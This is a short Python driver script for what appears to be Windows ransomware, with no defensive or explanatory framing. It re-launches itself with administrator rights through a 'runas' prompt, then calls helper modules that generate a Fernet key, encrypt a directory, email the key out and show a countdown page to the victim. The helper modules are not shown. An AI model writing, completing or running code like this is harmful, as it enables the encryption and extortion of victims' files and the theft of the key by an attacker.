#!/usr/bin/env python
#coding:utf-8

import cryptography
import subprocess, sys, os, ctypes
from cryptography.fernet import Fernet
from hashlib import sha256
from modules import crypt, sendMail, systeme, compteurPage


userProfile = os.environ["USERNAME"]
drive = os.environ["SystemDrive"]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    systeme.adminUser()
    crypt.write_key()
    crypt.load_key()
    crypt.repertoire()
    sendMail.send_key()
    compteurPage.countdown()

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
